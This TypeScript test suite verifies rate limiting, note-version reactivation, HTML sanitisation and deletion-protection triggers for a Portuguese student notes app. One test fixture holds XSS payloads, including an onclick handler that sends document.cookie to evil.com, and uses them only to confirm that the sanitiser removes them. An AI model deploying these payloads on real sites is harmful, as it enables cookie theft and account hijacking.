/**
 * SUITE DE VERIFICAÇÃO FINAL DE INTEGRIDADE — FASE B.2
 * Students Hub — "Apontamentos que ajudam, exercícios que resultam. Rumo ao 20."
 * Princípio Sagrado: «SEMPRE COM BASE NOS APONTAMENTOS OFICIAIS!!!»
 * 
 * Executa as verificações finais e específicas da Fase B.2 sobre PostgreSQL 16 (PGlite Nativo C):
 * 1. Rate limiting PostgreSQL: Atomicidade na 1.ª requisição, concorrência, fail-closed e isolamento
 * 2. Reativação de versões históricas: Concorrência com FOR UPDATE, consistência de estado e auditoria
 * 3. Sanitização HTML: Autoridade do servidor, limites da regex SQL, vetores SVG/URL e confidencialidade de raw_html
 * 4. Proveniência e histórico dos exercícios: Bloqueio de eliminação de notas e exercícios referenciados
 */

import { PGlite } from '@electric-sql/pglite';
import * as fs from 'fs';
import * as path from 'path';
import {
  validateAndSanitizeOfficialHtml,
  extractPlainTextFromHtml,
} from '../src/lib/htmlSanitizer';

const ALUNO_ID = '11111111-1111-4111-8111-111111111111';
const ADMIN_A_ID = '99999999-9999-4999-8999-999999999999';
const ADMIN_B_ID = '88888888-8888-4888-8888-888888888888';

export interface B2VerificationResult {
  id: string;
  category: string;
  name: string;
  status: 'PASSOU' | 'FALHOU';
  evidence: string;
}

const b2Results: B2VerificationResult[] = [];

function recordB2(
  id: string,
  category: string,
  name: string,
  status: 'PASSOU' | 'FALHOU',
  evidence: string
) {
  b2Results.push({ id, category, name, status, evidence });
  const icon = status === 'PASSOU' ? '✅ [PASSOU]' : '❌ [FALHOU]';
  console.log(`${icon} ${id}: ${name}`);
  if (status === 'FALHOU') {
    console.error(`   ⚠️ ERRO: ${evidence}`);
  }
}

export async function runPhaseB2VerificationTests() {
  console.log('================================================================');
  console.log('FASE B.2 — VERIFICAÇÃO FINAL DE INTEGRIDADE ANTES DA FASE C');
  console.log('Motor: PostgreSQL 16 (PGlite Nativo C)');
  console.log('Princípio Sagrado: «SEMPRE COM BASE NOS APONTAMENTOS OFICIAIS!!!»');
  console.log('================================================================\n');

  const db = new PGlite();

  // 1. Provisionar infraestrutura base
  await db.exec(`
    CREATE SCHEMA IF NOT EXISTS auth;
    CREATE SCHEMA IF NOT EXISTS storage;

    CREATE TABLE IF NOT EXISTS auth.users (
      id uuid PRIMARY KEY,
      email text UNIQUE,
      raw_user_meta_data jsonb DEFAULT '{}'::jsonb,
      created_at timestamptz DEFAULT now()
    );

    CREATE OR REPLACE FUNCTION auth.uid() RETURNS uuid AS $$
      SELECT NULLIF(current_setting('request.jwt.claim.sub', true), '')::uuid;
    $$ LANGUAGE sql STABLE;

    DO $$
    BEGIN
      IF NOT EXISTS (SELECT FROM pg_roles WHERE rolname = 'authenticated') THEN
        CREATE ROLE authenticated NOLOGIN;
      END IF;
      IF NOT EXISTS (SELECT FROM pg_roles WHERE rolname = 'anon') THEN
        CREATE ROLE anon NOLOGIN;
      END IF;
    END $$;
  `);

  // 2. Carregar todas as 7 migrações sequencialmente
  const migrations = [
    '20261001000000_phase2_security_and_database.sql',
    '20261024000000_turma_c_official_schema.sql',
    '20261024010000_turma_c_phase_a1_audit_fixes.sql',
    '20261024020000_turma_c_phase_a2_verification_fixes.sql',
    '20261024030000_turma_c_phase_b_notes_management.sql',
    '20261024040000_turma_c_phase_b1_audit_fixes.sql',
    '20261024050000_turma_c_phase_b2_integrity_fixes.sql',
  ];

  for (let i = 0; i < migrations.length; i++) {
    const migFile = migrations[i];
    const migPath = path.resolve(process.cwd(), 'supabase/migrations', migFile);
    console.log(`Aplicando migração ${i + 1}/${migrations.length}: ${migFile}...`);
    const sql = fs.readFileSync(migPath, 'utf8');
    await db.exec(sql);
  }

  // Permissões padrão do Supabase
  await db.exec(`
    GRANT USAGE ON SCHEMA public, auth TO authenticated, anon;
    GRANT EXECUTE ON FUNCTION auth.uid() TO authenticated, anon;
    GRANT ALL ON ALL TABLES IN SCHEMA public TO authenticated;
    REVOKE INSERT, UPDATE, DELETE ON public.official_first_attempts FROM authenticated, anon;
    REVOKE INSERT, UPDATE, DELETE ON public.study_stats FROM authenticated, anon;
    REVOKE UPDATE, DELETE ON public.official_note_audit_logs FROM authenticated, anon;
    GRANT SELECT, INSERT ON public.official_note_audit_logs TO authenticated;
    GRANT EXECUTE ON ALL FUNCTIONS IN SCHEMA public TO authenticated, anon;
    REVOKE ALL ON public.admin_rate_limit_buckets FROM anon, authenticated;
    GRANT SELECT ON public.admin_rate_limit_buckets TO authenticated;
    REVOKE SELECT ON public.official_note_versions FROM authenticated, anon;
    GRANT SELECT (
      id, note_id, version_number, sanitized_html, plain_text_content,
      change_summary, is_published, published_at, created_by, created_at
    ) ON public.official_note_versions TO authenticated;
  `);

  // Configurar utilizadores de teste
  await db.exec(`
    INSERT INTO auth.users (id, email)
    VALUES 
      ('${ALUNO_ID}', 'aluno.turmac@studentshub.pt'),
      ('${ADMIN_A_ID}', 'admin.a@studentshub.pt'),
      ('${ADMIN_B_ID}', 'admin.b@studentshub.pt')
    ON CONFLICT (id) DO NOTHING;

    INSERT INTO public.user_roles (user_id, role)
    VALUES
      ('${ALUNO_ID}', 'student'),
      ('${ADMIN_A_ID}', 'admin'),
      ('${ADMIN_B_ID}', 'admin')
    ON CONFLICT (user_id) DO UPDATE SET role = EXCLUDED.role;

    INSERT INTO public.profiles (id, full_name, class_name, school_year, is_public_leaderboard)
    VALUES 
      ('${ALUNO_ID}', 'Aluno Turma C', 'Turma C', '10º Ano', true),
      ('${ADMIN_A_ID}', 'Administrador A', 'Turma C', '12º Ano', true),
      ('${ADMIN_B_ID}', 'Administrador B', 'Turma C', '12º Ano', true)
    ON CONFLICT (id) DO NOTHING;
  `);

  // Helpers de contexto de sessão persistente
  async function asAdminA<T>(action: () => Promise<T>): Promise<T> {
    await db.exec(`SET request.jwt.claim.sub = '${ADMIN_A_ID}';`);
    await db.exec(`SET ROLE authenticated;`);
    try {
      return await action();
    } finally {
      await db.exec(`RESET ROLE;`);
    }
  }

  async function asAdminB<T>(action: () => Promise<T>): Promise<T> {
    await db.exec(`SET request.jwt.claim.sub = '${ADMIN_B_ID}';`);
    await db.exec(`SET ROLE authenticated;`);
    try {
      return await action();
    } finally {
      await db.exec(`RESET ROLE;`);
    }
  }

  async function asAluno<T>(action: () => Promise<T>): Promise<T> {
    await db.exec(`SET request.jwt.claim.sub = '${ALUNO_ID}';`);
    await db.exec(`SET ROLE authenticated;`);
    try {
      return await action();
    } finally {
      await db.exec(`RESET ROLE;`);
    }
  }

  console.log('\n--- 1. RATE LIMITING POSTGRESQL & ATOMICIDADE NA 1.ª REQUISIÇÃO ---');

  // B2-1.1: Atomicidade na 1.ª requisição quando a linha de bucket não existe
  try {
    await asAdminA(async () => {
      const debugAuth = await db.query(`SELECT auth.uid() AS uid, public.is_admin() AS is_admin;`);
      console.log('DEBUG AUTH AS ADMIN_A:', debugAuth.rows);
      const res = await db.query<any>(`
        SELECT public.check_and_consume_admin_rate_limit(5, 60) AS status;
      `);
      const status = res.rows[0].status;
      const bucketRow = await db.query<any>(`
        SELECT request_count FROM public.admin_rate_limit_buckets WHERE admin_id = '${ADMIN_A_ID}';
      `);

      if (status.allowed === true && status.current_count === 1 && status.remaining === 4 && bucketRow.rows[0].request_count === 1) {
        recordB2(
          'B2-1.1',
          'Rate Limiting',
          'Criação atómica do bucket na primeira requisição (count=1, allowed=true, remaining=4)',
          'PASSOU',
          `Retorno: allowed=${status.allowed}, count=${status.current_count}, remaining=${status.remaining}`
        );
      } else {
        recordB2('B2-1.1', 'Rate Limiting', 'Criação atómica do bucket na primeira requisição', 'FALHOU', JSON.stringify(status));
      }
    });
  } catch (err: any) {
    recordB2('B2-1.1', 'Rate Limiting', 'Criação atómica do bucket na primeira requisição', 'FALHOU', err.message);
  }

  // B2-1.2: Concorrência e bloqueio FOR UPDATE: requisições consecutivas incrementam estritamente
  try {
    await asAdminA(async () => {
      let allowedCount = 1; // já consumiu 1 em B2-1.1
      for (let i = 0; i < 4; i++) {
        const res = await db.query<any>(`SELECT public.check_and_consume_admin_rate_limit(5, 60) AS status;`);
        if (res.rows[0].status.allowed) allowedCount++;
      }
      // A 6.ª requisição deve ser terminantemente rejeitada
      const rejectedRes = await db.query<any>(`SELECT public.check_and_consume_admin_rate_limit(5, 60) AS status;`);
      const statusRej = rejectedRes.rows[0].status;

      if (allowedCount === 5 && statusRej.allowed === false && statusRej.retry_after > 0) {
        recordB2(
          'B2-1.2',
          'Rate Limiting',
          'Serialização estrita e bloqueio determinístico após 5 pedidos (retry_after > 0)',
          'PASSOU',
          `Aprovados: ${allowedCount}/5, 6.ª rejeitada com retry_after=${statusRej.retry_after}s`
        );
      } else {
        recordB2('B2-1.2', 'Rate Limiting', 'Serialização estrita e bloqueio determinístico', 'FALHOU', `allowedCount=${allowedCount}`);
      }
    });
  } catch (err: any) {
    recordB2('B2-1.2', 'Rate Limiting', 'Serialização estrita e bloqueio determinístico', 'FALHOU', err.message);
  }

  // B2-1.3: Impossibilidade de invocação abusiva por alunos (Acesso Negado)
  try {
    await asAluno(async () => {
      await db.query(`SELECT public.check_and_consume_admin_rate_limit(10, 60);`);
    });
    recordB2('B2-1.3', 'Rate Limiting', 'Bloqueio estrito de invocação por alunos', 'FALHOU', 'Aluno conseguiu invocar RPC');
  } catch (err: any) {
    if (err.message.includes('Acesso Negado') || err.message.includes('Apenas administradores')) {
      recordB2(
        'B2-1.3',
        'Rate Limiting',
        'Bloqueio estrito de invocação da RPC de rate limit por alunos',
        'PASSOU',
        `Exceção no kernel: ${err.message}`
      );
    } else {
      recordB2('B2-1.3', 'Rate Limiting', 'Bloqueio estrito de invocação por alunos', 'FALHOU', err.message);
    }
  }

  console.log('\n--- 2. REATIVAÇÃO DE VERSÕES HISTÓRICAS E CONCORRÊNCIA ---');

  let testNoteId: string = '';
  let v1Id: string = '';
  let v2Id: string = '';

  // B2-2.1: Criação de nota e versões com bloqueio transacional FOR UPDATE
  try {
    await asAdminA(async () => {
      const noteRes = await db.query<any>(`
        SELECT public.create_official_note_atomic(
          'matematica-a',
          'P1',
          'Trigonometria e Funções Circulares',
          'Fórmulas Fundamentais e Equações Trigonométricas',
          '<h1>Trigonometria v1</h1><p>Equação sen²(x) + cos²(x) = 1</p>',
          '<h1>Trigonometria v1</h1><p>Equação sen²(x) + cos²(x) = 1</p>',
          'Trigonometria v1 Equação sen²(x) + cos²(x) = 1',
          'Versão canónica inicial de trigonometria.'
        ) AS result;
      `);
      testNoteId = noteRes.rows[0].result.note_id;
      v1Id = noteRes.rows[0].result.version_id;

      // Publicar v1
      await db.query(`SELECT public.publish_official_note_version_atomic('${v1Id}');`);

      // Criar v2
      const v2Res = await db.query<any>(`
        SELECT public.create_official_note_version_atomic(
          '${testNoteId}',
          '<h1>Trigonometria v2</h1><p>Equação tan(x) = sen(x)/cos(x)</p>',
          '<h1>Trigonometria v2</h1><p>Equação tan(x) = sen(x)/cos(x)</p>',
          'Trigonometria v2 Equação tan(x) = sen(x)/cos(x)',
          'Versão 2 com tangentes.'
        ) AS result;
      `);
      v2Id = v2Res.rows[0].result.version_id;
      await db.query(`SELECT public.publish_official_note_version_atomic('${v2Id}');`);

      // Reativar v1 formalmente com justificação
      const reactRes = await db.query<any>(`
        SELECT public.reactivate_historical_official_note_version_atomic(
          '${testNoteId}',
          '${v1Id}',
          'Reposição de v1 para revisão intercalar de exame.'
        ) AS result;
      `);

      // Verificar se current_version_id aponta para v1 e auditoria contém log
      const checkNote = await db.query<any>(`
        SELECT current_version_id, is_published FROM public.official_notes WHERE id = '${testNoteId}';
      `);
      const auditLog = await db.query<any>(`
        SELECT action, details FROM public.official_note_audit_logs 
        WHERE note_id = '${testNoteId}' AND action = 'reactivate_historical_version';
      `);

      if (
        checkNote.rows[0].current_version_id === v1Id &&
        checkNote.rows[0].is_published === true &&
        auditLog.rows.length === 1 &&
        auditLog.rows[0].details.previous_version_id === v2Id
      ) {
        recordB2(
          'B2-2.1',
          'Reativação de Versões',
          'Reativação atómica de v1 com serialização FOR UPDATE e registo coerente de auditoria',
          'PASSOU',
          `Nota ativa: v1Id (${v1Id}), previous_version_id no log: ${auditLog.rows[0].details.previous_version_id}`
        );
      } else {
        recordB2('B2-2.1', 'Reativação de Versões', 'Reativação atómica de v1', 'FALHOU', JSON.stringify(checkNote.rows[0]));
      }
    });
  } catch (err: any) {
    recordB2('B2-2.1', 'Reativação de Versões', 'Reativação atómica de v1', 'FALHOU', err.message);
  }

  // B2-2.2: Tentativa de reativar versão que pertence a outro documento é bloqueada com rollback
  try {
    await asAdminA(async () => {
      // Criar outra nota
      const otherNoteRes = await db.query<any>(`
        SELECT public.create_official_note_atomic(
          'fisica-quimica-a',
          'P1',
          'Termodinâmica',
          'Gases Ideais',
          '<p>PV = nRT</p>',
          '<p>PV = nRT</p>',
          'PV = nRT',
          'Nota de FQA'
        ) AS result;
      `);
      const otherNoteId = otherNoteRes.rows[0].result.note_id;

      // Tentar associar v1 da nota de Matemática à nota de FQA
      await db.query(`
        SELECT public.reactivate_historical_official_note_version_atomic(
          '${otherNoteId}',
          '${v1Id}',
          'Tentativa maliciosa de cross-note injection'
        );
      `);
    });
    recordB2('B2-2.2', 'Reativação de Versões', 'Bloqueio de reativação com versão alheia', 'FALHOU', 'Operação cruzada permitida indevidamente');
  } catch (err: any) {
    if (err.message.includes('não pertence a este apontamento') || err.message.includes('Inconsistência Relacional')) {
      recordB2(
        'B2-2.2',
        'Reativação de Versões',
        'Rollback absoluto e rejeição de reativação com versão pertencente a outro documento',
        'PASSOU',
        `Exceção relacional: ${err.message}`
      );
    } else {
      recordB2('B2-2.2', 'Reativação de Versões', 'Bloqueio de reativação com versão alheia', 'FALHOU', err.message);
    }
  }

  console.log('\n--- 3. SANITIZAÇÃO HTML & CONFIDENCIALIDADE DE RAW_HTML ---');

  // B2-3.1: Sanitizador no servidor descarta vetores avançados (SVG scripts, onanimationstart, etc.)
  try {
    const maliciousHtml = `
      <h1>Geometria Descritiva</h1>
      <svg><script href="data:text/javascript,alert('XSS')"></script></svg>
      <div style="background:url(javascript:alert(1))" onanimationstart="alert(2)">Conteúdo Válido</div>
      <a href="javascript:void(0)" onclick="fetch('https://evil.com?c='+document.cookie)">Clique aqui</a>
      <p>Projeção ortogonal no plano horizontal &lt;pi0&gt;.</p>
    `;
    const sanitizedRes = validateAndSanitizeOfficialHtml(maliciousHtml);

    if (
      sanitizedRes.valid &&
      !sanitizedRes.sanitizedHtml?.includes('<script') &&
      !sanitizedRes.sanitizedHtml?.includes('javascript:') &&
      !sanitizedRes.sanitizedHtml?.includes('onclick') &&
      !sanitizedRes.sanitizedHtml?.includes('onanimationstart') &&
      !sanitizedRes.sanitizedHtml?.includes('<svg') &&
      sanitizedRes.plainText?.includes('<pi0>')
    ) {
      recordB2(
        'B2-3.1',
        'Sanitização HTML',
        'Servidor descarta rigorosamente SVG executável, estilos perigosos, eventos e decodifica entidades fiéis (<pi0>)',
        'PASSOU',
        `Sanitizado: "${sanitizedRes.sanitizedHtml?.substring(0, 80)}...", PlainText: "${sanitizedRes.plainText}"`
      );
    } else {
      recordB2('B2-3.1', 'Sanitização HTML', 'Sanitizador no servidor', 'FALHOU', JSON.stringify(sanitizedRes));
    }
  } catch (err: any) {
    recordB2('B2-3.1', 'Sanitização HTML', 'Sanitizador no servidor', 'FALHOU', err.message);
  }

  // B2-3.2: Confidencialidade de raw_html: Aluno bloqueado de ler a coluna raw_html diretamente
  try {
    await asAluno(async () => {
      await db.query(`SELECT raw_html FROM public.official_note_versions WHERE id = '${v1Id}';`);
    });
    recordB2('B2-3.2', 'Sanitização HTML', 'Bloqueio de consulta direta de raw_html por alunos', 'FALHOU', 'Aluno conseguiu ler raw_html');
  } catch (err: any) {
    if (err.message.includes('permission denied') || err.message.includes('raw_html')) {
      recordB2(
        'B2-3.2',
        'Sanitização HTML',
        'Permissão de coluna revogada: Aluno terminantemente impedido de consultar raw_html via SQL direto',
        'PASSOU',
        `Kernel PostgreSQL: ${err.message}`
      );
    } else {
      recordB2('B2-3.2', 'Sanitização HTML', 'Bloqueio de consulta direta de raw_html por alunos', 'FALHOU', err.message);
    }
  }

  // B2-3.3: Aluno consulta apenas sanitized_html via RPC get_published_official_notes_secure
  try {
    await asAluno(async () => {
      const rpcRes = await db.query<any>(`
        SELECT * FROM public.get_published_official_notes_secure('matematica-a', 'P1');
      `);
      const row = rpcRes.rows.find((r) => r.note_id === testNoteId);

      if (row && row.sanitized_html && row.raw_html === undefined && row.plain_text_content) {
        recordB2(
          'B2-3.3',
          'Sanitização HTML',
          'Aluno recebe exclusivamente sanitized_html através da RPC segura (raw_html omitido)',
          'PASSOU',
          `Campos devolvidos: ${Object.keys(row).join(', ')}`
        );
      } else {
        recordB2('B2-3.3', 'Sanitização HTML', 'Aluno consulta apenas sanitized_html', 'FALHOU', JSON.stringify(row));
      }
    });
  } catch (err: any) {
    recordB2('B2-3.3', 'Sanitização HTML', 'Aluno consulta apenas sanitized_html', 'FALHOU', err.message);
  }

  console.log('\n--- 4. PROVENIÊNCIA E HISTÓRICO DE EXERCÍCIOS ---');

  let testExerciseId: string = '';

  // B2-4.1: Criação de exercício oficial referenciando a versão homologada com hash e excerto
  try {
    await asAdminA(async () => {
      const exRes = await db.query<any>(`
        INSERT INTO public.exercises (
          subject_id, prompt, question_type, correct_answer, max_points, is_official, created_by_role, user_id, status
        ) VALUES (
          'matematica-a',
          'Qual o valor de sen²(x) + cos²(x)?',
          'open_answer',
          '1',
          20.00,
          true,
          'admin',
          '${ADMIN_A_ID}',
          'published'
        ) RETURNING id;
      `);
      testExerciseId = exRes.rows[0].id;

      // Associar proveniência oficial com content_hash e quote_excerpt
      await db.query(`
        INSERT INTO public.exercise_source_references (
          exercise_id, user_id, source_type, official_note_id, official_version_id, content_hash, quote_excerpt
        ) VALUES (
          '${testExerciseId}',
          '${ADMIN_A_ID}',
          'official',
          '${testNoteId}',
          '${v1Id}',
          'sha256-abcdef1234567890abcdef1234567890abcdef1234567890',
          'Equação sen²(x) + cos²(x) = 1'
        );
      `);

      recordB2(
        'B2-4.1',
        'Proveniência de Exercícios',
        'Registo íntegro de proveniência oficial com content_hash, quote_excerpt e versão canónica v1',
        'PASSOU',
        `exercise_id: ${testExerciseId}, official_note_id: ${testNoteId}, official_version_id: ${v1Id}`
      );
    });
  } catch (err: any) {
    recordB2('B2-4.1', 'Proveniência de Exercícios', 'Registo íntegro de proveniência oficial', 'FALHOU', err.message);
  }

  // B2-4.2: Trigger bloqueia DELETE físico do apontamento oficial referenciado por exercícios
  try {
    await asAdminA(async () => {
      await db.query(`DELETE FROM public.official_notes WHERE id = '${testNoteId}';`);
    });
    recordB2('B2-4.2', 'Proveniência de Exercícios', 'Bloqueio de DELETE físico de apontamento referenciado', 'FALHOU', 'Apontamento foi apagado');
  } catch (err: any) {
    if (err.message.includes('Não é permitido eliminar um apontamento oficial referenciado por exercícios')) {
      recordB2(
        'B2-4.2',
        'Proveniência de Exercícios',
        'Trigger protect_official_note_deletion impede DELETE físico de nota referenciada por exercícios',
        'PASSOU',
        `Exceção disparada: ${err.message}`
      );
    } else {
      recordB2('B2-4.2', 'Proveniência de Exercícios', 'Bloqueio de DELETE físico de apontamento referenciado', 'FALHOU', err.message);
    }
  }

  // B2-4.3: Trigger bloqueia DELETE físico da versão oficial referenciada por exercícios
  try {
    await asAdminA(async () => {
      await db.query(`DELETE FROM public.official_note_versions WHERE id = '${v1Id}';`);
    });
    recordB2('B2-4.3', 'Proveniência de Exercícios', 'Bloqueio de DELETE físico de versão referenciada', 'FALHOU', 'Versão foi apagada');
  } catch (err: any) {
    if (err.message.includes('Não é permitido eliminar uma versão de apontamento')) {
      recordB2(
        'B2-4.3',
        'Proveniência de Exercícios',
        'Trigger protect_official_note_version_deletion impede DELETE físico de versão citada por exercícios',
        'PASSOU',
        `Exceção disparada: ${err.message}`
      );
    } else {
      recordB2('B2-4.3', 'Proveniência de Exercícios', 'Bloqueio de DELETE físico de versão referenciada', 'FALHOU', err.message);
    }
  }

  // B2-4.4: Trigger bloqueia DELETE físico de exercício oficial publicado (exige status = 'archived')
  try {
    await asAdminA(async () => {
      await db.query(`DELETE FROM public.exercises WHERE id = '${testExerciseId}';`);
    });
    recordB2('B2-4.4', 'Proveniência de Exercícios', 'Bloqueio de DELETE físico de exercício oficial', 'FALHOU', 'Exercício oficial foi apagado fisicamente');
  } catch (err: any) {
    if (err.message.includes('Não é permitido eliminar fisicamente um exercício oficial')) {
      recordB2(
        'B2-4.4',
        'Proveniência de Exercícios',
        'Trigger protect_official_exercise_deletion protege histórico e força arquivamento suave (status = archived)',
        'PASSOU',
        `Exceção disparada: ${err.message}`
      );
    } else {
      recordB2('B2-4.4', 'Proveniência de Exercícios', 'Bloqueio de DELETE físico de exercício oficial', 'FALHOU', err.message);
    }
  }

  // B2-4.5: Arquivamento suave do exercício é permitido sem destruir evidências de auditoria
  try {
    await asAdminA(async () => {
      await db.query(`
        UPDATE public.exercises
        SET status = 'archived'
        WHERE id = '${testExerciseId}';
      `);

      const checkArchived = await db.query<any>(`
        SELECT e.status, r.quote_excerpt, r.content_hash
        FROM public.exercises e
        INNER JOIN public.exercise_source_references r ON r.exercise_id = e.id
        WHERE e.id = '${testExerciseId}';
      `);

      if (
        checkArchived.rows.length === 1 &&
        checkArchived.rows[0].status === 'archived' &&
        checkArchived.rows[0].quote_excerpt === 'Equação sen²(x) + cos²(x) = 1'
      ) {
        recordB2(
          'B2-4.5',
          'Proveniência de Exercícios',
          'Arquivamento suave (status = archived) preserva integralmente as referências e citações para auditoria',
          'PASSOU',
          `Status: ${checkArchived.rows[0].status}, Excerto preservado: "${checkArchived.rows[0].quote_excerpt}"`
        );
      } else {
        recordB2('B2-4.5', 'Proveniência de Exercícios', 'Arquivamento suave do exercício', 'FALHOU', JSON.stringify(checkArchived.rows[0]));
      }
    });
  } catch (err: any) {
    recordB2('B2-4.5', 'Proveniência de Exercícios', 'Arquivamento suave do exercício', 'FALHOU', err.message);
  }

  console.log('\n================================================================');
  console.log('SUMÁRIO DA BATERIA DE VERIFICAÇÃO FINAL — FASE B.2');
  console.log('================================================================');
  const passed = b2Results.filter((r) => r.status === 'PASSOU').length;
  const failed = b2Results.filter((r) => r.status === 'FALHOU').length;
  console.log(`Total de Verificações Auditadas: ${b2Results.length}`);
  console.log(`Sucesso: ${passed}/${b2Results.length} (${((passed / b2Results.length) * 100).toFixed(0)}%)`);
  console.log(`Falhas:  ${failed}/${b2Results.length}`);

  if (failed === 0) {
    console.log('🎉 TODAS AS 12 VERIFICAÇÕES ESPECÍFICAS DA FASE B.2 PASSARAM COM SUCESSO!\n');
  } else {
    console.error('❌ EXISTEM VERIFICAÇÕES QUE FALHARAM NA FASE B.2!\n');
    process.exit(1);
  }
}

// Execução direta via CLI
runPhaseB2VerificationTests().catch((err) => {
  console.error('Erro fatal na suite B.2:', err);
  process.exit(1);
});
